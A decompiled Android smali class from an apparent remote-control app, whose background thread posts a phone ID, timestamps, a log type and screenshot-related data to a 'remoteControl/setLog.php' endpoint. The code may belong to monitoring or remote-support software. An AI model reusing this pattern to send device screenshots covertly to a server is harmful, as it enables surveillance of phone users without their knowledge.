.class final Lcom/app/activity/ScreenshotActivity$2;
.super Ljava/lang/Thread;
.source "ScreenshotActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/app/activity/ScreenshotActivity;->a(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private synthetic a:Ljava/lang/String;

.field private synthetic b:Lcom/app/activity/ScreenshotActivity;


# direct methods
.method constructor <init>(Lcom/app/activity/ScreenshotActivity;Ljava/lang/String;)V
    .locals 0

    .line 161
    iput-object p1, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    iput-object p2, p0, Lcom/app/activity/ScreenshotActivity$2;->a:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 7

    .line 165
    :try_start_0
    invoke-static {}, Ler;->a()Ljava/lang/String;

    move-result-object v1

    .line 167
    new-instance v6, Ljava/util/HashMap;

    invoke-direct {v6}, Ljava/util/HashMap;-><init>()V

    const-string v0, "idPhone"

    .line 168
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    invoke-virtual {v3}, Lcom/app/activity/ScreenshotActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v0, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "dateConnexion"

    .line 169
    invoke-virtual {v6, v0, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "idLog"

    .line 170
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    invoke-static {v3}, Lcom/app/activity/ScreenshotActivity;->a(Lcom/app/activity/ScreenshotActivity;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v0, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "type"

    .line 171
    iget-object v2, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    invoke-static {v2}, Lcom/app/activity/ScreenshotActivity;->b(Lcom/app/activity/ScreenshotActivity;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v0, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "data"

    .line 172
    iget-object v2, p0, Lcom/app/activity/ScreenshotActivity$2;->a:Ljava/lang/String;

    invoke-virtual {v6, v0, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 174
    iget-object v0, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    .line 175
    invoke-virtual {v0}, Lcom/app/activity/ScreenshotActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lda;->f(Landroid/content/Context;)I

    move-result v0

    iget-object v2, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    .line 177
    invoke-static {v2}, Lcom/app/activity/ScreenshotActivity;->b(Lcom/app/activity/ScreenshotActivity;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    .line 178
    invoke-static {v3}, Lcom/app/activity/ScreenshotActivity;->a(Lcom/app/activity/ScreenshotActivity;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    iget-object v4, p0, Lcom/app/activity/ScreenshotActivity$2;->a:Ljava/lang/String;

    iget-object v5, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    .line 179
    invoke-virtual {v5}, Lcom/app/activity/ScreenshotActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    .line 174
    invoke-static/range {v0 .. v5}, Lu;->a(ILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Landroid/content/Context;)J

    move-result-wide v0

    const-string v2, "remoteControl/setLog.php"

    .line 181
    invoke-static {v2, v6}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v2

    if-eqz v2, :cond_0

    long-to-int v1, v0

    .line 182
    iget-object v0, p0, Lcom/app/activity/ScreenshotActivity$2;->b:Lcom/app/activity/ScreenshotActivity;

    invoke-virtual {v0}, Lcom/app/activity/ScreenshotActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v1, v0}, Lu;->g(ILandroid/content/Context;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 185
    invoke-virtual {v0}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    return-void
.end method
